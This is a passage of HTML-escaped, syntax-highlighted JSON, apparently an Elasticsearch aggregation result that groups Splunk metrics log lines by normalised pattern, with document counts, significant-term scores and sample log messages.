                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMJbLjo3PexoUukH&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:17:02.780 +0800 INFO  Metrics - group=per_sourcetype_thruput, series=\&quot;scheduler\&quot;, kbps=0.014869, eps=0.032258, kb=0.460938, ev=1, avg_age=0.000000, max_age=0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=\&quot;//////.\&quot;,_=.,_=.,_=.,_=,_=.,_=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13063&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13063&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13063&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;27.241628614916287&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13140&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13063&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMKILjo3PexoUulQ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:16:31.780 +0800 INFO  Metrics - group=per_source_thruput, series=\&quot;/applications/splunk/var/log/splunk/metrics.log\&quot;, kbps=0.326188, eps=2.032164, kb=10.112305, ev=63, avg_age=0.968254, max_age=1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=.,_=.,_=.,_=.,_=.,_=.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;average_kbps&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;20.38013481592441&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17357&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMKILjo3PexoUulA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:16:31.781 +0800 INFO  Metrics - group=thruput, name=index_thruput, instantaneous_kbps=0.875684, instantaneous_eps=2.032165, average_kbps=0.340430, total_k_processed=33138.000000, kb=27.147461, ev=63.000000&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=,_=,_=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11417&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11417&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qwork_units&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11417&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;31.50372251905054&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11417&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
